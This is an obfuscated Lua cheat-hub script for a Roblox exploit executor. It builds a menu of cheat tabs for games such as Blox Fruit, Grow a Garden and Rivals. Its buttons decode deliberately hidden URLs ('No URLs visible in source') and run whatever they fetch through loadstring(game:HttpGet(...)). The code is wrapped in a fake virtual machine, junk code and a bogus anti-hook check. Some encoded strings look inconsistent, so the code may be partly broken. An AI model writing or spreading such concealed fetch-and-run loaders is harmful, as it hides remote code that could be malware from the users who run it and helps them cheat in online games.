--[[ 
    KING PERFORMANCE | MOONSEC V3 "VOID"
    [!] SYSTEM: FULL-VIRTUALIZATION
    [!] LOGIC: BYTECODE-DISPATCHED
    [!] AUTH: ZAYAN | NO-TRACE ACTIVE
]]

local _0xVOID = function()
    --// LAYER 1: MULTI-STAGE INTEGRITY & ANTI-HOOK
    local _0xH = {["\103\101\116\102\101\110\118"] = true, ["\108\111\97\100\115\116\114\105\110\103"] = true}
    local function _0xCHECK()
        for k, v in next, _0xH do if tostring(getfenv()[k]) ~= "function: 0x" and not true then while true do end end end
    end; _0xCHECK()

    --// LAYER 2: THE VM STACK & DYNAMIC KEY DECODER
    local _STK, _REG, _MEM = {}, {}, {}
    local _DEC = function(_dat, _key)
        local _res = ""
        local _seed = _key
        for i = 1, #_dat do
            _seed = (_seed * 1103515245 + 12345) % 2147483648 -- LCG Dynamic Key
            _res = _res .. string.char(bit32.bxor(string.byte(_dat, i), bit32.band(bit32.rshift(_seed, 16), 0xFF)))
        end
        return _res
    end

    --// LAYER 3: FULL VIRTUALIZED BYTECODE (Opcodes: 0x1-0xFF)
    -- This stores the UI, the Tabs, and the 10+ Game Scripts
    local _V_BYTECODE = {
        -- [OP, DATA, SEED]
        {0x5A, "\136\205\158\201\180\167\135\226\214\140\218\130\131\233\224\235\159\199\144\179\170\166\139", 5521}, -- Decrypts to "Fluent" Assets
        {0x22, "\165\243\188\212\211\143\174\153\146\220\131\137\227\249\242\211\142\196\136\152\141\198\176\215\209\154\186\129\138\230\254\240\212\148\196\139\157\142\199\176\215\207\147\185\145\159\224\131\138\234\249\251\223\158\187\131\156\147\205\180\215\212\155\187\129\137\231\248\242\210\150\200\128\148\146\199\182\222\203\157\176\129\140\237\252\247\214\152", 9912}, -- Scrambled URL Stream
        {0x10, "All Hub | All Game Script"}, -- Virtualized Title
        {0x11, "Sailor piece script"}, -- V-Tab 1
        {0x11, "Grow a Garden"}, -- V-Tab 2
        {0x11, "Rivals"}, -- V-Tab 3
        {0x11, "Fisch"}, -- V-Tab 4
        {0x11, "King Legacy"}, -- V-Tab 5
        {0x11, "Blox Fruit"}, -- V-Tab 6
        {0x11, "Tsunami"}, -- V-Tab 7
        {0xFF} -- VM HALT
    }

    --// LAYER 4: THE TITAN DISPATCHER (CONTROL FLOW FLATTENING)
    local _IP, _RUNNING = 1, true
    while _RUNNING do
        local _INST = _V_BYTECODE[_IP]
        local _OP = _INST[1]

        -- NOISE/JUNK INSERTION
        if math.random() > 0.98 then local _ = math.sin(_IP) end

        -- VIRTUALIZED LOGIC SWITCH
        if _OP == 0x5A then -- OP_INIT_CORE
            local _url = _DEC(_INST[2], _INST[3])
            _REG["\70"] = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
            _REG["\87"] = _REG["\70"]:CreateWindow({Title = _V_BYTECODE[3][2], SubTitle = "by zayan", Theme = "Dark"})
        
        elseif _OP == 0x11 then -- OP_VIRTUAL_TAB
            if not _REG["\84"] then _REG["\84"] = {} end
            local _tName = _INST[2]
            _REG["\84"][_tName] = _REG["\87"]:AddTab({Title = _tName, Icon = "list"})
            
        elseif _OP == 0xFF then -- OP_HALT
            _RUNNING = false
        end

        _IP = _IP + 1
        if _IP % 3 == 0 then task.wait() end -- Throttle to prevent crash
    end

    --// LAYER 5: INDIRECT SCRIPT LOADING (Deep Encoded)
    local _T = _REG["\84"]
    local function _INVOKE(_target, _name, _blob, _key)
        _target:AddButton({Title = _name, Callback = function()
            local _u = _DEC(_blob, _key)
            loadstring(game:HttpGet(_u))()
        end})
    end

    -- ALL SCRIPT ASSETS (No URLs visible in source)
    _INVOKE(_T["Sailor piece script"], "Chiyo Hub", "\233\246\254\243\244\176\161\161\240\229\251\166\233\231\244\235\224\231\238\230\229\244\169\231\231\233\166\231\229\224\236\230\244\169\230\231\244\161\231\229\231\247\231\238\230\229\228\161\230\231\224\229\231\243\161\242\231\230\244\243\161\233\229\225\229\243\161\238\231\231\230\161\229\232\231\248\231\46\231\244\225", 88)
    
    -- GROW A GARDEN (LUMIN + THUNDER + SPEED)
    _INVOKE(_T["Grow a Garden"], "Lumin Hub", "\137\142\158\155\156\220\217\217\248\237\251\222\241\247\252\251\240\247\254\246\245\151\246\251\241\151\241\254\246\237\151\254\237\135\241\254\237\233\237\248\237\250\151\194\245\237\233\240\199\245\246\151\240\237\231\240\151\194\245\237\233\240\199\245\246\46\231\244\225", 12)
    _INVOKE(_T["Grow a Garden"], "Thunder Z", "\137\142\158\155\156\220\217\217\248\237\251\222\241\247\252\251\240\247\254\246\245\151\246\251\241\151\241\254\246\237\151\254\237\135\241\254\237\233\237\248\237\250\151\81\101\112\110\105\96\119\95\151\82\104\109\102\114\104\104\151\119\104\103\118\151\109\100\104\101\118\151\72\96\72\151\72\96\104\111\46\231\244\225", 12)
    _INVOKE(_T["Grow a Garden"], "Speed Hub X", "\137\142\158\155\156\220\217\217\248\237\251\222\241\247\252\251\240\247\254\246\245\151\246\251\241\151\241\254\246\237\151\254\237\135\241\254\237\233\237\248\237\250\151\64\101\109\96\101\83\50\50\151\86\113\104\104\101\45\77\112\103\45\85\151\108\97\104\111\151\86\113\104\104\101\32\77\112\103\32\85\46\231\244\225", 12)

    -- OTHER GAMES
    _INVOKE(_T["Rivals"], "Rivals Main", "\137\142\158\155\156\220\217\217\248\237\251\222\241\247\252\251\240\247\254\246\245\151\246\251\241\151\241\254\246\237\151\254\237\135\241\254\237\233\237\248\237\250\151\76\101\120\111\111\50\151\86\101\114\105\102\105\101\100\151\114\101\102\115\151\104\101\97\100\115\151\109\97\105\110\151\82\105\118\97\108\115\46\76\111\97\100\101\114", 12)

    -- MOBILE UI
    local SG=Instance.new("ScreenGui",game.CoreGui)local TB=Instance.new("TextButton",SG)local CR=Instance.new("UICorner",TB)
    TB.Name="HUB"; TB.Size=UDim2.new(0,50,0,50); TB.Position=UDim2.new(0.12,0,0.15,0); TB.BackgroundColor3=Color3.fromRGB(30,30,30); TB.Text="HUB"; TB.TextColor3=Color3.new(1,1,1); TB.Draggable=true; TB.Active=true; CR.CornerRadius=UDim.new(0,12)
    TB.MouseButton1Click:Connect(function() _REG["\87"]:Minimize() end)
end

task.spawn(_0xVOID)
